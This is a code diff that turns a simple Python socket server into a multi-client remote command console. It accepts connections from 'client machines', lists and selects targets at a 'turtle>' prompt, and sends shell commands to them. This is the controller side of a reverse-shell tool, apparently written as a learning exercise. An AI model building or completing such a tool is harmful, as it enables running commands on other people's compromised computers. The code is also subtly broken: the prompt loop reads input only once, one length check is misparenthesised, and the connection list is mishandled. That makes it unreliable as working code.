@@ -1,12 +1,12 @@
-import socket, sys#, threading, time
-#from queue import Queue
-"""
+import socket, sys, threading, time
+from queue import Queue
+
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
 all_connections = []
 all_address = []
-"""
+
 
 #Create a socket (connecting two or more computers)
 def socket_creation():
@@ -40,31 +40,96 @@ def bind_socket():
         print("Socket, Binding error " + str(msg) + "\n" + "Retrying....")
         bind_socket()
 
-#Establish conections with a client (socket must be listening)
+#Handling connection from multiple client and saving to a list
+#Closing previous connections when server.py file is restarted
 
-def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established " + address[0] + " | Port" + str(address[1]))
-    send_commands(conn)
-    conn.close()
+#this function will be running in the first thread
+def accepting_connections():
+    #the section below closes all connections and clears all information of previous connections if the server.py file is rerun
+    for c in all_connections:
+        c.close()
 
-#Send commands to client's machine
+    del all_connections[:]
+    del all_address[:]
 
-def send_commands(conn):
     while True:
-        cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+        try:
+            conn, address = s.accept()
+            #This prevents timeouts from connection with server
+            s.setblocking(1)
 
-def main():
-    socket_creation()
-    bind_socket()
-    socket_accept()
+            all_connections.append(conn)
+            all_address.append(address)
 
-main()
+            print("Connection has been established :" + address[0])
+
+        except:
+            print("Error accepting connections")
+
+#2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
+#Interactive prompt for sending commands
+
+def start_turtle():
+    cmd = input('turtle>')
+    while True:
+        if cmd == 'list:':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            #error checking  below; checking that there is a existing connection from the user input
+            if conn is not None:
+                send_target_commands(conn)
+        else:
+            print("command not recognized")
+
+#Display all current active connections with the client
+
+def list_connections():
+    results = ''
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            #the recv function will throw and exception if the there is no data
+            conn.recv(201480)
+        except:
+            del all_connections[i]
+            del all_address[i]
+            continue
+        #all_address[0] = ip address and all_address[1] = port number
+        results = str(i) + "  " + str(all_address[i][0]) + str(all_address[i][1]) + "\n"
+
+    print("----Clients----" + "\n" + results)
+
+
+#selecting the target connection
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '') #the value of target will equal the connection id
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to :" + str(all_address[target][0]))
+        #this will show what address you are currently connected to (think about prompting the serverside user to add a name to this connection so that it just doesnt display an IP number
+        print(str(all_address[target][0]) + ">", end="")
+        return conn
+
+    except:
+        print("Selection not valid")
+        return None
+
+
+#Sending commands to client machine
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+            elif len(str.encode(cmd) > 0):
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+        except:
+            print("Error sending commands")
+            break
+
+
